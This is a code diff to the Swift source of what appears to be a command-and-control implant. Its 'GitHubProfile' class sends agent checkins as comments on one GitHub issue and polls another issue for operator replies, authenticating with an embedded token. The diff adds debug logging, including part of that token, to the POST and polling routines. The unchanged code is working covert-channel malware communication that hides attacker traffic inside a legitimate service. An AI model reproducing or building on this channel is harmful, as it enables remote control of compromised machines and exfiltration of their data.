@@ -29,6 +29,11 @@ class GitHubProfile: C2Profile {
         // Generate a unique branch name for this agent
         agentBranch = agentConfig.payloadUUID
         connected = true
+        print("[GitHub] Initialized with:")
+        print("[GitHub]   Repo: \(agentConfig.githubUsername)/\(agentConfig.githubRepo)")
+        print("[GitHub]   Client Issue: #\(agentConfig.githubClientIssue)")
+        print("[GitHub]   Server Issue: #\(agentConfig.githubServerIssue)")
+        print("[GitHub]   Token: \(agentConfig.githubToken.prefix(10))...")
         return true
     }
     
@@ -42,27 +47,37 @@ class GitHubProfile: C2Profile {
     
     // Send message via GitHub issue comment (used for initial checkin)
     private func sendViaIssueComment(data: String) -> String {
+        print("[GitHub] Sending message (length: \(data.count) chars)")
+
         // Post comment to client issue
         let postResult = postIssueComment(issueNumber: agentConfig.githubClientIssue, body: data)
         if !postResult {
+            print("[GitHub] Failed to post comment to client issue, returning NO_CONNECT")
             return "NO_CONNECT"
         }
-        
+
+        print("[GitHub] Successfully posted to client issue #\(agentConfig.githubClientIssue), polling for response...")
+
         // Poll for response on server issue
         var response = ""
         var attempts = 0
         let maxAttempts = 30
-        
+
         while response.isEmpty && attempts < maxAttempts {
             sleep(2)
             response = readLatestIssueComment(issueNumber: agentConfig.githubServerIssue)
             attempts += 1
+            if attempts % 5 == 0 {
+                print("[GitHub] Still polling... (attempt \(attempts)/\(maxAttempts))")
+            }
         }
-        
+
         if response.isEmpty {
+            print("[GitHub] No response received after \(maxAttempts) attempts, returning NO_CONNECT")
             return "NO_CONNECT"
         }
-        
+
+        print("[GitHub] Received response (length: \(response.count) chars)")
         return response
     }
     
@@ -106,32 +121,40 @@ class GitHubProfile: C2Profile {
     private func postIssueComment(issueNumber: Int, body: String) -> Bool {
         dispatch.enter()
         var success = false
-        
+
         let urlString = "https://api.github.com/repos/\(agentConfig.githubUsername)/\(agentConfig.githubRepo)/issues/\(issueNumber)/comments"
         guard let url = URL(string: urlString) else {
+            print("[GitHub] Failed to create URL for posting comment")
             dispatch.leave()
             return false
         }
-        
+
         var request = URLRequest(url: url)
         request.httpMethod = "POST"
         request.setValue("token \(agentConfig.githubToken)", forHTTPHeaderField: "Authorization")
         request.setValue("application/vnd.github.v3+json", forHTTPHeaderField: "Accept")
         request.setValue(agentConfig.userAgent, forHTTPHeaderField: "User-Agent")
         request.setValue("application/json", forHTTPHeaderField: "Content-Type")
-        
+
         let payload = ["body": body]
         request.httpBody = try? JSONSerialization.data(withJSONObject: payload)
-        
+
         let task = URLSession(configuration: .ephemeral).dataTask(with: request) { data, response, error in
+            if let error = error {
+                print("[GitHub] POST comment error: \(error.localizedDescription)")
+            }
             if let httpResponse = response as? HTTPURLResponse {
+                print("[GitHub] POST comment to issue #\(issueNumber) - Status: \(httpResponse.statusCode)")
+                if httpResponse.statusCode != 201, let data = data, let errorBody = String(data: data, encoding: .utf8) {
+                    print("[GitHub] Error response: \(errorBody)")
+                }
                 success = httpResponse.statusCode == 201
             }
             self.dispatch.leave()
         }
         task.resume()
         dispatch.wait()
-        
+
         return success
     }
     
